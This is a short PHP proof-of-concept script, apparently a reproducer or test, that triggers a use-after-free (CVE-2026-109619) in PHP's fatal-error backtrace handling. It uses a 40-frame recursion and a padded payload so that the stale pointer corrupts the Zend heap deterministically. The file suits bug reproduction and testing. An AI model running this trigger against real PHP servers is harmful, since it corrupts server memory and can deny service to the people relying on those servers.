<?php
// Producer for CVE-2026-109619 (fatal error backtrace UAF).
// Triggering a fatal error here makes PHP store a request-owned backtrace in
// EG(last_fatal_error_backtrace); the unclean shutdown skips its reset, leaving
// a stale pointer into freed request memory for the next request's diagnostic
// (zend_error_zstr_at -> zval_ptr_dtor) to free again -> use-after-free.
//
// The 40-frame stack keeps the backtrace array large enough that the stale
// destruction corrupts the Zend MM heap deterministically.
function r($n, $payload) {
    if ($n > 0) {
        return r($n - 1, $payload);
    }
    trigger_error("boom_" . $payload, E_USER_ERROR);
}
r(40, str_repeat("A", 200));
